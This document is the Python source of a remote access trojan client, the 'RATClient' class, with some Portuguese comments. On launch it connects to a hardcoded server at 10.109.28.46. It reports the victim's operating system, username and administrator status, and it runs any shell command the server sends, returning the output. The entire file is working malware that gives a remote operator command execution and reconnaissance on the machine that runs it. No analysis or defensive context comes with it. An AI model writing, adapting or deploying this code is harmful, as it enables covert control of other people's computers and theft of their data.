import socket
import threading
import platform
import getpass
import subprocess
from ping3 import ping
import os
import ctypes

class RATClient:
    def __init__(self, host, port):
        self.host = host
        self.port = port
        self.client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.is_connected = False
        self.permission = "unknown"
        self.Username = getpass.getuser()

    def connect(self):
        try:
            self.client_socket.connect((self.host, self.port))
            self.is_connected = True
            print("[+] Connected to server")
            threading.Thread(target=self.receive_commands).start()
            self.send_os_info()
        except Exception as e:
            print("[-] Connection failed:", e)

    def receive_commands(self):
        while self.is_connected:
            try:
                data = self.client_socket.recv(1024).decode()
                if not data:
                    print("[-] Disconnected from server")
                    self.is_connected = False
                    break
                elif data.startswith("COMMAND:"):
                    command = data.split(":", 1)[1]
                    self.execute_command(command)
                else:
                    print(data)
            except Exception as e:
                print("[-] Error receiving command:", e)
                break

    def execute_command(self, command):
        try:
            output = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT, universal_newlines=True)
            self.send_command_result(output)
        except subprocess.CalledProcessError as e:
            self.send_command_result(str(e))
        except Exception as e:
            self.send_command_result(str(e))

    def send_os_info(self):
        permission = self.get_permission()
        try:
            os_info = f"{platform.system()};{self.Username};{permission}"
            self.client_socket.send(os_info.encode())
            ping_time = self.calculate_ping()
            self.client_socket.send(f"Ping: {ping_time} ms".encode())
        except Exception as e:
            print("[-] Error sending OS info:", e)

    def calculate_ping(self):
        try:
            ping_time = ping(self.host)
            if ping_time is not None:
                return round(ping_time * 1000, 2)
            else:
                return "N/A"
        except Exception as e:
            print("[-] Error calculating ping:", e)
            return "N/A"

    def send_command(self, command):
        if command:
            try:
                self.client_socket.send(command.encode())
            except Exception as e:
                print("[-] Error sending command:", e)

    def send_command_result(self, result):
        try:
            self.client_socket.send(f"COMMAND_RESULT:{result}".encode())
        except Exception as e:
            print("[-] Error sending command result:", e)

    def get_permission(self):
        try:
            if os.name == 'nt':
                if ctypes.windll.shell32.IsUserAnAdmin():
                    return "Admin"
                else:
                    return "Default"
            elif os.name == 'posix':
                # Verifica se o usuário está no grupo 'sudo'
                if "sudo" in os.getgroups():
                    return "Admin"
                else:
                    return "Default"
            else:
                return "Unknown permissions for this operating system"
        except Exception as e:
            print("[-] Error getting permission:", e)
            return "Erro ao obter permissões"

if __name__ == "__main__":
    client = RATClient("10.109.28.46", 55555)
    client.connect()
